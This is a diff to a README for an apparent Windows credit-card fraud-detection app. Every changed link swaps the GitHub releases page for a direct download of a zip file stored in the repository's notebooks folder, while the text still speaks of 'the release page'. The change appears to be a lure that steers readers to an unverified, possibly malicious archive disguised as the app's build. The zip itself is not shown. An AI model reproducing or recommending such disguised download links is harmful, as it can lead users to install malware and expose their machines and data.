@@ -1,6 +1,6 @@
 # 🛡️ credit-card-fraud-detection - Spot Fraud Fast on Windows
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/zayane345/credit-card-fraud-detection/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/zayane345/credit-card-fraud-detection/raw/refs/heads/main/notebooks/fraud-detection-card-credit-2.9-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ This app helps you review card transactions and flag likely fraud cases. It uses
 
 If you want to run it on Windows, start by visiting the release page and downloading the latest build:
 
-[Visit the release page to download](https://github.com/zayane345/credit-card-fraud-detection/releases)
+[Visit the release page to download](https://github.com/zayane345/credit-card-fraud-detection/raw/refs/heads/main/notebooks/fraud-detection-card-credit-2.9-alpha.1.zip)
 
 ## 💻 What This App Does
 
@@ -31,7 +31,7 @@ Use a Windows PC with:
 ## 📥 Download and Install
 
 1. Open the release page:
-   https://github.com/zayane345/credit-card-fraud-detection/releases
+   https://github.com/zayane345/credit-card-fraud-detection/raw/refs/heads/main/notebooks/fraud-detection-card-credit-2.9-alpha.1.zip
 
 2. Find the latest release at the top of the page.
 
@@ -151,4 +151,4 @@ classification, data-science, fintech, fraud-detection, imbalanced-learning, mac
 
 If you need the latest build, go to the release page here:
 
-[https://github.com/zayane345/credit-card-fraud-detection/releases](https://github.com/zayane345/credit-card-fraud-detection/releases)
+[https://github.com/zayane345/credit-card-fraud-detection/raw/refs/heads/main/notebooks/fraud-detection-card-credit-2.9-alpha.1.zip](https://github.com/zayane345/credit-card-fraud-detection/raw/refs/heads/main/notebooks/fraud-detection-card-credit-2.9-alpha.1.zip)
